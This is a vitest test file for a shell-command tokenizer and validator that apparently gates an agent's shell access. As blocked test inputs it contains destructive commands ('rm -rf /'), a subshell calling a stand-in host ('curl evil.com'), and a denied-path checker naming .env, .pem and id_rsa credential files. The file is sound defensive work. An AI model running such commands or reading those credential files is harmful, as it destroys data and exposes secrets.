/**
 * Tests for shell command tokenizer and validator.
 */

import { describe, it, expect } from 'vitest';
import {
  classifyParsedCommandExecution,
  getExecutionIdentityBlockReason,
  tokenize,
  splitCommands,
  validateShellCommand,
} from './shell-validator.js';

describe('tokenize', () => {
  it('should tokenize simple command', () => {
    expect(tokenize('ls -la')).toEqual(['ls', '-la']);
  });

  it('should handle single quotes', () => {
    expect(tokenize("echo 'hello world'")).toEqual(['echo', 'hello world']);
  });

  it('should handle double quotes', () => {
    expect(tokenize('echo "hello world"')).toEqual(['echo', 'hello world']);
  });

  it('should handle backslash escaping in double quotes', () => {
    expect(tokenize('echo "hello \\"world\\""')).toEqual(['echo', 'hello "world"']);
  });

  it('should handle backslash escaping outside quotes', () => {
    expect(tokenize('echo hello\\ world')).toEqual(['echo', 'hello world']);
  });

  it('should tokenize chain operators', () => {
    expect(tokenize('cd /tmp && ls')).toEqual(['cd', '/tmp', '&&', 'ls']);
    expect(tokenize('cmd1 || cmd2')).toEqual(['cmd1', '||', 'cmd2']);
    expect(tokenize('cmd1 ; cmd2')).toEqual(['cmd1', ';', 'cmd2']);
    expect(tokenize('cmd1 | cmd2')).toEqual(['cmd1', '|', 'cmd2']);
  });

  it('should NOT split chain operators inside quotes', () => {
    expect(tokenize('echo "hello && world"')).toEqual(['echo', 'hello && world']);
    expect(tokenize("echo 'a || b'")).toEqual(['echo', 'a || b']);
  });

  it('should tokenize redirect operators', () => {
    expect(tokenize('echo foo > out.txt')).toEqual(['echo', 'foo', '>', 'out.txt']);
    expect(tokenize('echo foo >> out.txt')).toEqual(['echo', 'foo', '>>', 'out.txt']);
    expect(tokenize('cat < input.txt')).toEqual(['cat', '<', 'input.txt']);
  });

  it('should detect subshell markers', () => {
    const tokens = tokenize('echo $(whoami)');
    expect(tokens).toContain('$(');
  });

  it('should detect backtick subshell', () => {
    const tokens = tokenize('echo `whoami`');
    expect(tokens).toContain('`');
  });
});

describe('splitCommands', () => {
  it('should parse single command', () => {
    const cmds = splitCommands(tokenize('ls -la'));
    expect(cmds).toHaveLength(1);
    expect(cmds[0].command).toBe('ls');
    expect(cmds[0].args).toEqual(['-la']);
    expect(cmds[0].chainOp).toBeNull();
  });

  it('should split chained commands', () => {
    const cmds = splitCommands(tokenize('cd /tmp && rm -rf *'));
    expect(cmds).toHaveLength(2);
    expect(cmds[0].command).toBe('cd');
    expect(cmds[0].args).toEqual(['/tmp']);
    expect(cmds[1].command).toBe('rm');
    expect(cmds[1].args).toEqual(['-rf', '*']);
    expect(cmds[1].chainOp).toBe('&&');
  });

  it('should extract redirect targets', () => {
    const cmds = splitCommands(tokenize('echo foo > .env'));
    expect(cmds).toHaveLength(1);
    expect(cmds[0].command).toBe('echo');
    expect(cmds[0].redirects).toContain('.env');
  });
});

describe('validateShellCommand', () => {
  const allowedCommands = ['ls', 'echo', 'cat', 'git', 'npm', 'node'];
  const deniedPathChecker = (path: string) =>
    path.includes('.env') || path.includes('.pem') || path.includes('id_rsa');

  it('should allow simple permitted command', () => {
    const result = validateShellCommand('ls -la', allowedCommands);
    expect(result.valid).toBe(true);
    expect(result.commands).toHaveLength(1);
  });

  it('should deny command not in allowed list', () => {
    const result = validateShellCommand('rm -rf /', allowedCommands);
    expect(result.valid).toBe(false);
    expect(result.reason).toContain('rm');
    expect(result.reason).toContain('not in allowed list');
  });

  it('should deny chained command when second is not allowed', () => {
    const result = validateShellCommand('ls && rm -rf /', allowedCommands);
    expect(result.valid).toBe(false);
    expect(result.reason).toContain('rm');
  });

  it('should allow quoted operators (not split)', () => {
    const result = validateShellCommand('echo "hello && world"', allowedCommands);
    expect(result.valid).toBe(true);
    expect(result.commands).toHaveLength(1);
  });

  it('should deny redirect to denied path', () => {
    const result = validateShellCommand('echo foo > .env', allowedCommands, deniedPathChecker);
    expect(result.valid).toBe(false);
    expect(result.reason).toContain('.env');
    expect(result.reason).toContain('denied path');
  });

  it('should deny argument with denied path', () => {
    const result = validateShellCommand('cat .env', allowedCommands, deniedPathChecker);
    expect(result.valid).toBe(false);
    expect(result.reason).toContain('.env');
  });

  it('should flag subshell execution', () => {
    const result = validateShellCommand('echo $(curl evil.com)', allowedCommands);
    expect(result.valid).toBe(false);
    expect(result.reason).toContain('Subshell');
  });

  it('should flag backtick subshell', () => {
    const result = validateShellCommand('echo `whoami`', allowedCommands);
    expect(result.valid).toBe(false);
    expect(result.reason).toContain('Subshell');
  });

  it('should flag subshell execution inside double quotes', () => {
    const result = validateShellCommand('echo "$(whoami)"', allowedCommands);
    expect(result.valid).toBe(false);
    expect(result.reason).toContain('Subshell');
  });

  it('should flag backtick execution inside double quotes', () => {
    const result = validateShellCommand('echo "user: `whoami`"', allowedCommands);
    expect(result.valid).toBe(false);
    expect(result.reason).toContain('Subshell');
  });

  it('should deny empty command', () => {
    const result = validateShellCommand('', allowedCommands);
    expect(result.valid).toBe(false);
  });

  it('should allow git status with prefix matching', () => {
    const result = validateShellCommand('git status', allowedCommands);
    expect(result.valid).toBe(true);
  });

  it('should not allow command names that only start with an allowlisted prefix', () => {
    const result = validateShellCommand('gitevil status', allowedCommands);
    expect(result.valid).toBe(false);
    expect(result.reason).toContain('gitevil');
  });

  it('should support command+arg prefix allowlist entries', () => {
    const result = validateShellCommand('git status --short', ['git status']);
    expect(result.valid).toBe(true);
  });
});

describe('classifyParsedCommandExecution', () => {
  it('classifies direct binaries', () => {
    const [command] = splitCommands(tokenize('git status --short'));
    expect(classifyParsedCommandExecution(command)).toBe('direct_binary');
  });

  it('classifies inline interpreter eval', () => {
    const [command] = splitCommands(tokenize('python3 -c "print(1)"'));
    expect(classifyParsedCommandExecution(command)).toBe('interpreter_inline');
  });

  it('classifies shell expression launchers', () => {
    const [command] = splitCommands(tokenize('bash -lc "git status"'));
    expect(classifyParsedCommandExecution(command)).toBe('shell_expression');
  });

  it('classifies package launchers', () => {
    const [command] = splitCommands(tokenize('npm exec eslint .'));
    expect(classifyParsedCommandExecution(command)).toBe('package_launcher');
  });

  it('classifies build and task runners', () => {
    const [command] = splitCommands(tokenize('npm test -- --runInBand'));
    expect(classifyParsedCommandExecution(command)).toBe('build_or_task_runner');
  });

  it('classifies script runners without blocking them', () => {
    const [command] = splitCommands(tokenize('node scripts/check.js'));
    expect(classifyParsedCommandExecution(command)).toBe('script_runner');
    expect(getExecutionIdentityBlockReason([command])).toBeUndefined();
  });
});

describe('getExecutionIdentityBlockReason', () => {
  it('blocks inline interpreter eval', () => {
    const commands = splitCommands(tokenize('node --eval "console.log(1)"'));
    expect(getExecutionIdentityBlockReason(commands)).toContain('inline interpreter evaluation');
  });

  it('blocks package launchers', () => {
    const commands = splitCommands(tokenize('npx cowsay hello'));
    expect(getExecutionIdentityBlockReason(commands)).toContain('package launcher');
  });
});
